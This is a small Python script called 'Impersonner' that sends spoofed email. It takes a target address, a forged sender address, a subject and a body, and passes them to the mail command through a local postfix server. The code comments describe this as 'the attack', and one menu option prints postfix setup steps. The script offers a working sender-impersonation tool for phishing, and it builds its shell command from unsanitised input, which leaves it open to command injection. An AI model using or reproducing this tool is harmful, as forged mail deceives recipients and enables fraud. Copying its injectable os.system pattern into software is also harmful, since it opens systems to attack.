
#!/usr/bin/python3 
import os 
import sys 

#functions here boi 
def clearscreen():
	if (os.name == "nt"):
		os.system("cls")
	else: 
		os.system("clear")


#before showing a banner lets clear the terminal cuz yeah boii

clearscreen()


#banner 
print ("Impersonner") 
print ("Coded by: MrYes2020") 
print ("WARNING!!!!!!! To run this script perfectly you need to have installed on your linux machine postfix and have it configured!!")
print ("WARNING!!!!!!! You have to run me as a root if u havent done it yet!") 
print ("\n------------------")
print ("[0.5] i dont have the required file installed") 
print ("[1] normal impersonner") 
print ("[0] exit boiiiii")
print ("\n------------------")


#input 
choice = input("Enter your mode [1][2][3][4]: ")
if (choice == "0.5"):
	clearscreen() 
	print ("Now! There is just one thing you need to make this program work perfectly! And it is installing postfix (and configuring it cuz like duh)")
	print ("------------------------")
	print ("	----------------")
	print ("	1. sudo apt-get install mailutils") 
	print ("	2. A windows will popup and you have to choose internet site option")
	print ("	3. Input a random domain for your postfix server") 
	print (" 	4. wait for the installation to finish") 
	print (" 	5. sudo nano /etc/postix/main.cf")
	print ("	6. when the nano editor opens scroll down the file until you see the line 'inet_interfaces = all' and change it to 'inet_interfaces = loopback-only'")
	print ("	7. final step is to reset the service with the command 'service postfix restart'")
	print ("	----------------")
	print ("------------------------")
elif (choice == "1"):
	clearscreen()
	print ("You choosed the normal mode!")
	email = input("Enter here the target's email: ")
	impersonneremail = input("Enter here the email of the sender: ")
	subject = input("Enter here the subject: ") 
	body = input("Enter here the body: ") 
	#kk now we have everything we need to start the attack 
	clearscreen()
	print("Sending the mail")
	os.system("echo " + "'" + body + "'" + " | mail -s " + "'" + subject + "'" + " -a 'From: " + impersonneremail + "' " + email)
	print("Email sent")
elif (choice == "0"):
	clearscreen()
	print ("KK goodbye boiiii see u") 
else: 
	clearscreen()
	print ("Please input only one of these modes [1][2][3][4] or exit with number [0]!!")
